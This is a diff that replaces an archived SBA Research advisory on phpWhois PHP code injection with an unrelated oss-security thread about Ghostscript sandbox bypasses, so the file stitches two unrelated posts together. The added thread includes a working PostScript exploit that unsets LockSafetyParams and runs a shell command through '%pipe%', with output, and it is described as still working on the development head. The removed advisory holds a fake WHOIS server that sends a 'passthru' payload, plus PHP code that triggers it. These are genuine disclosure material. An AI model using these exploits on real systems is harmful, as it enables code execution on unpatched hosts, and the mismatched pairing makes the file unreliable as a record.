@@ -1,178 +1,226 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/08/01/3
-Message-ID: <e63b4c67-4a64-6301-37b8-3660f45370b6@sba-research.org>
-Date: Wed, 1 Aug 2018 19:57:22 +0200
-From: SBA Research Advisory <advisory@...-research.org>
-To: <oss-security@...ts.openwall.com>
-Subject: [SBA-ADV-20180425-01] CVE-2015-5243 rediscovered: phpWhois before 5.1.0 PHP Code Injection
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/09/03/2
+Message-ID: <20180903105747.dihmczuqhl4kcnx5@suse.de>
+Date: Mon, 3 Sep 2018 12:57:47 +0200
+From: Marcus Meissner <meissner@...e.de>
+To: oss-security@...ts.openwall.com
+Subject: Re: Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?
 Content-Type: text/plain; charset=utf-8
 
-# phpWhois PHP Code Injection #
+Hi,
 
-Link: https://github.com/sbaresearch/advisories/tree/public/2018/SBA-ADV-20180425-01_phpWhois_Code_Execution
+I am still holding back CVE requesting as CERT promised to do this.
 
-## Vulnerability Overview ##
+If they do not reply with a plan until tomorrow I will proceed with requesting.
 
-phpWhois and some of its forks in versions before 5.1.0 are prone to a
-code injection vulnerability due to insufficient sanitization of returned
-WHOIS data. This allows attackers controlling the WHOIS information of a
-requested domain to execute arbitrary PHP code in the context of the
-application.
+Ciao, Marcus
+On Wed, Aug 29, 2018 at 01:43:22PM -0700, Tavis Ormandy wrote:
+> I should note, just add `userdict /setpagedevice undef` at the top if you
+> want to test it with ImageMagick.
+> 
+> Tavis.
+> 
+> On Wed, Aug 29, 2018 at 1:14 PM Tavis Ormandy <taviso@...gle.com> wrote:
+> 
+> > Thanks Marcus, here are some more necessary commits:
+> >
+> >
+> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=520bb0ea7519aa3e79db78aaf0589dae02103764
+> > # 699654 D /invalidaccess checks stop working after a failed restore
+> >
+> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=5b5536fa88a9e885032bc0df3852c3439399a5c0
+> > # 699670 gssetresolution memory corruption
+> >
+> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
+> > # 699671 handling /undefined results in SEGV
+> >
+> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
+> > # 699676 PDF interpreter can leave dangerous operators available
+> >
+> > Please note that not all issues are resolved, and I have exploits that
+> > still work against HEAD.
+> >
+> > For example, this will still work if you pull master as of this writing:
+> >
+> > $ cat testcase.pdf
+> > %!PS
+> > % This is ghostscript bug #699687 (split out from bug #699654)
+> >
+> > a0 % just select a papersize to initialize page device
+> >
+> > % You can't def HWResolution (for example), because currentpagedevice is
+> > readonly:
+> > %
+> > % GS>currentpagedevice wcheck ==
+> > % false
+> > %
+> > % But you can just put or astore into it, because the array itself is
+> > writable:
+> > % GS>currentpagedevice /HWResolution get wcheck ==
+> > % true
+> > %
+> > % If you put some junk in there, then grestore stops working.
+> > currentpagedevice /HWResolution get 0 (foobar) put
+> >
+> > % this grestore will fail, `stopped` just handles the error instead of
+> > aborting.
+> > { grestore } stopped {} if
+> >
+> > % now LockSafetyParams will be incorrectly unset, you can check like this:
+> > % GS>mark currentdevice getdeviceprops .dicttomark /.LockSafetyParams get
+> > == pop
+> > % false
+> >
+> > % we can change and configure devices now, so make sure we're using one
+> > with
+> > % a OutputFile property.
+> > (ppmraw) selectdevice
+> >
+> > % run a shell command
+> > mark /OutputFile (%pipe%id) currentdevice putdeviceprops
+> > showpage
+> > $ evince testcase.pdf
+> > uid=1000(taviso) gid=1000(taviso) groups=1000(taviso),10(wheel)
+> > context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+> > (libspectre) ghostscript reports: ioerror -12
+> >
+> > Tavis.
+> >
+> > On Tue, Aug 28, 2018 at 2:26 AM Marcus Meissner <meissner@...e.de> wrote:
+> >
+> >> Hi,
+> >>
+> >> I had 4 CVEs assigned yesterday afternoon already working from CERTs list,
+> >> see inline comments below. Please adjust if something is incorrect in
+> >> them.
+> >>
+> >> CERT has mailed overnight that they will take care of the CVE assignment,
+> >> so
+> >> I am defering the rest to them.
+> >>
+> >> Ciao, Marcus
+> >>
+> >> On Mon, Aug 27, 2018 at 04:02:46PM -0700, Tavis Ormandy wrote:
+> >> > Here is an update, Artifex made a press release
+> >> > <
+> >> https://www.darkreading.com/prnewswire2.asp?rkey=20180824UN89145&filter=3930
+> >> >
+> >> > listing
+> >> > some necessary commits, but the list was incomplete.
+> >> >
+> >> > Here is a list of relevant commits I'm aware of so far, some issues are
+> >> > still open with working exploits available. It's my understanding that
+> >> no
+> >> > new release is planned until late September, and vendors need to either
+> >> > ship a git snapshot when all issues are resolved, or apply patches. I
+> >> have
+> >> > testcases for each problem, but I think the bugs will be visible
+> >> eventually
+> >> > so I'm not posting them here.
+> >> >
+> >> >
+> >> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
+> >> > # 699671
+> >> > handling /undefined results in SEGV
+> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0edd3d6c63
+> >> > # 699659 missing type check in ztype
+> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=78911a01b6 #
+> >> > 699654 A /invalidaccess checks stop working after a failed restore
+> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=5516c614dc33
+> >> #
+> >> > 699654 B /invalidaccess checks stop working after a failed restore
+> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=79cccf641486
+> >> #
+> >> > 699654 C /invalidaccess checks stop working after a failed restore
+> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=b326a716 #
+> >> 699655
+> >> > - missing type checking in setcolor
+> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=c3476dde #
+> >> 699656
+> >>
+> >>
+> >> > - LockDistillerParams boolean missing type checks
+> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=a054156d42
+> >>         CVE-2018-15910
+> >>
+> >>
+> >> > # 699658 - Bypassing PermitFileReading by handling undefinedfilename
+> >> errors
+> >>
+> >>
+> >> >
+> >> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0b6cd1918e1ec4ffd087400a754a845180a4522b
+> >> > # 699660 - shading_param incomplete type checking
+> >> >
+> >> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=e01e77a36cbb2e0277bc3a63852244bec41be0f6
+> >> > # 699660 - shading_param incomplete type checking
+> >>         CVE-2018-15909
+> >>
+> >>
+> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=c432131c3f
+> >> > # 699661 - pdf14 garbage collection memory corruption
+> >> >
+> >> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=971472c83a345a16dac9f90f91258bb22dd77f22
+> >> > # 699663 - .setdistillerkeys memory corruption
+> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=241d911127
+> >> > # 699664 - corrupt device object after error in job
+> >>
+> >>
+> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0d3901189f
+> >> > # 699657 - .tempfile SAFER restrictions seem to be broken
+> >>         CVE-2018-15908
+> >>
+> >> >
+> >> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=8e9ce5016db968b40e4ec255a3005f2786cce45f
+> >>
+> >>
+> >> > # 699665 - memory corruption in aesdecode
+> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=b575e1ec42
+> >>
+> >>         CVE-2018-15911
+> >>
+> >> > # 699668 - .definemodifiedfont memory corruption if /typecheck is
+> >> handled
+> >> >
+> >> > Tavis
+> >> >
+> >> > On Thu, Aug 23, 2018 at 8:05 AM Bob Friesenhahn <
+> >> > bfriesen@...ple.dallas.tx.us> wrote:
+> >> >
+> >> > > On Thu, 23 Aug 2018, Leonardo Taccari wrote:
+> >> > > >
+> >> > > > (Regarding the `file.ps2' and `file.ps3' examples without `PS2:' or
+> >> > > > `PS3:' prefixes according `convert -debug Policy -log "%e"' it seems
+> >> > > > that they ends up as:
+> >> > > >
+> >> > > > Domain: Coder; rights=Read; pattern="PS" ...
+> >> > > >
+> >> > > > ...so should be blocked by the workaround described in
+> >> > > > VU#332928. But please correct me if I'm wrong.)
+> >> > >
+> >> > > This is likely due to header magic detection (e.g. "%!PS-Adobe").  It
+> >> > > is possible that a different path will be taken if the common
+> >> > > Postscript header is not detected.  The file extension may then be
+> >> > > used as a hint.  Also, there are a wide varieties of ImageMagick
+> >> > > versions in use, with a wide variety of behaviors.
+> >> > >
+> >> > > The version of ImageMagick provided by the Ubuntu Linux I am using at
+> >> > > this moment dates from 2012!
+> >> > >
+> >> > > Bob
+> >> > > --
+> >> > > Bob Friesenhahn
+> >> > > bfriesen@...ple.dallas.tx.us,
+> >> http://www.simplesystems.org/users/bfriesen/
+> >> > > GraphicsMagick Maintainer,    http://www.GraphicsMagick.org/
+> >> > >
+> >>
+> >> --
+> >> Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; D-90409 Nuernberg; Zi.
+> >> 3.1-33,+49-911-740 53-432,,serv=loki,mail=wotan,type=real <
+> >> meissner@...e.de>
+> >>
+> >
 
-* **Identifier**            : SBA-ADV-20180425-01
-* **Type of Vulnerability** : Code Injection
-* **Software/Product Name** : phpWhois
-* **Vendor**                : [phpwhois.org](http://www.phpwhois.org/),
-                              [abcdmitry](https://github.com/phpWhois/phpWhois),
-                              [jsmitty12](https://github.com/jsmitty12/phpWhois),
-                              [webalternative](https://github.com/webalternative/phpWhois)
-                              and others
-* **Affected Versions**     : phpwhois.org: 4.2.2 and probably prior,
-                              as well as the following forks
-                              abcdmitry: 4.2.5 and probably prior,
-                              jsmitty12: 5.0.2 and probably prior
-* **Fixed in Version**      : jsmitty12: 5.1.0
-* **CVE ID**                : CVE-2015-5243
-* **CVSSv3 Vector**         : CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
-* **CVSSv3 Base Score**     : 9.8 (Critical)
-
-## Vendor Description ##
-
-> This package contains a Whois (RFC954) library for PHP. It allows a
-> PHP program to create a Whois object, and obtain the output of a
-> whois query with the lookup function.
-
-Source: <https://github.com/phpWhois/phpWhois>
-
-## Impact ##
-
-By exploiting the vulnerability documented in this advisory, an
-attacker controlling the WHOIS information of a domain retrieved via
-phpWhois can execute arbitrary PHP code in the context of the
-application. The set of domains enabling this attack vector is limited
-to certain top-level domains. Sensitive data accessible by the
-application might get exposed through this attack.
-
-The vulnerability is fixed in version 5.1.0 or newer of jsmitty12's fork.
-We recommend upgrading to this version.
-
-## Vulnerability Description ##
-
-phpWhois implements multiple generic parsers for WHOIS data in
-`whois.parser.php`. The parser implemented in function
-`generic_parser_b` is vulnerable to injection of PHP code.
-
-The function `generic_parser_b` builds a PHP statement from WHOIS data
-values by concatenating strings without proper sanitization. It then
-passes the statement to the `eval` function:
-
-```php
-function generic_parser_b($rawdata, $items = array(), $dateformat = 'mdy', $hasreg = true, $scanall = false) {
-[...]
-    foreach ($rawdata as $val) {
-        if (trim($val) != '') {
-            if (($val[0] == '%' || $val[0] == '#') && $disok) {
-                $r['disclaimer'][] = trim(substr($val, 1));
-                $disok = true;
-                continue;
-            }
-            $disok = false;
-            reset($items);
-            foreach ($items as $match => $field) {
-                $pos = strpos($val, $match);
-                if ($pos !== false) {
-                    if ($field != '') {
-                        $var = '$r' . getvarname($field);
-                        $itm = trim(substr($val, $pos + strlen($match)));
-                        if ($itm != '')
-                            eval($var . '="' . str_replace('"', '\"', $itm) . '";');
-                    }
-                    if (!$scanall)
-                        break;
-                }
-            }
-        }
-[...]
-}
-```
-
-At least the following 33 top-level domain handlers make use of the
-vulnerable parser:
-
-```text
-ae, aero, ag, asia, au, bh, biz, cat, cn, co, co.za, fi, hu, in, info, jp, lu, me, mobi, museum, name, nz, org, pro, ru, sc, se, su, tel, travel, us, ws, xxx
-```
-
-## Proof-of-Concept ##
-
-An attacker can exploit this vulnerability by setting malicious WHOIS
-information such as `Registrant Name: ${passthru('id')}` for an arbitrary
-`.org` domain.
-Instead of a real name, we specify `${passthru('id')}` which PHP will
-interpret as a variable expansion inside double quoted string literals.
-We simulate this situation via a simple WHOIS server implementation:
-
-```py
-import SocketServer
-
-DATA = "Registrant Name: ${passthru('id')}\n"
-
-class WhoisHandler(SocketServer.BaseRequestHandler):
-    def handle(self):
-        self.request.recv(1024)
-        print('Request received')
-        self.request.sendall(DATA)
-        print('Payload sent')
-
-if __name__ == '__main__':
-    SocketServer.ThreadingTCPServer.allow_reuse_address = True
-    server = SocketServer.ThreadingTCPServer(('127.0.0.1', 9999), WhoisHandler)
-    server.serve_forever()
-```
-
-The following example sets up phpWhois to use the simulated WHOIS
-server and requests information for `example.org`:
-
-```php
-<?php
-require_once(__DIR__ . '/vendor/autoload.php');
-
-$whois = new phpWhois\Whois;
-$whois->useServer('org', '127.0.0.1:9999');
-echo $whois->lookup('example.org');
-```
-
-Therefore, the vulnerable phpWhois version executes the injected PHP
-statement `passthru('id')` which will execute the Unix `id` command on the
-server and return its output.
-
-## Timeline ##
-
-* `2018-04-25`: identification of vulnerability
-* `2018-04-26`: initial contact of several phpWhois and fork maintainers
-* `2018-04-26`: disclosed vulnerability to phpwhois.org project maintainer
-* `2018-04-27`: disclosed vulnerability to jsmitty12
-* `2018-04-30`: phpwhois.org project maintainer stated that it is a
-                known issue (CVE-2015-5243) with a fix committed at
-                <https://github.com/sparc/phpWhois.org>
-* `2018-04-30`: fix is not released yet and MITRE lists CVE-2015-5243
-                as assigned but private
-* `2018-05-29`: jsmitty12 released fixed version 5.1.0
-* `2018-08-01`: public disclosure
-
-## References ##
-
-* Original advisory: <https://blog.nettitude.com/uk/cve-2015-5243-phpwhois-remote-code-execution>
-* Fixes:
-  * <https://github.com/sparc/phpWhois.org/commit/5cc572490c9053d46598ec9348a11e36a5a33a46#diff-f150ae17da7341bf6c2eff928684b3a3>
-  * <https://github.com/Gemorroj/phpwhois/commit/91c937e03c876ba1290b6de2a3ad953d2105fdd0>
-  * <https://github.com/jsmitty12/phpWhois/commit/863ccf62824f9998099ed20c2952ec8953ce3d06>
-
-## Credits ##
-
-* Original advisory by Iain Wallace ([Nettitude](https://www.nettitude.com/))
-* Rediscovered by David Gnedt ([SBA Research](https://www.sba-research.org/))
-
-Download attachment "0xFBB8862F58F775B2.asc" of type "application/pgp-keys" (3092 bytes)
-
-Download attachment "signature.asc" of type "application/pgp-signature" (834 bytes)
+-- 
+Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; D-90409 Nuernberg; Zi. 3.1-33,+49-911-740 53-432,,serv=loki,mail=wotan,type=real <meissner@...e.de>
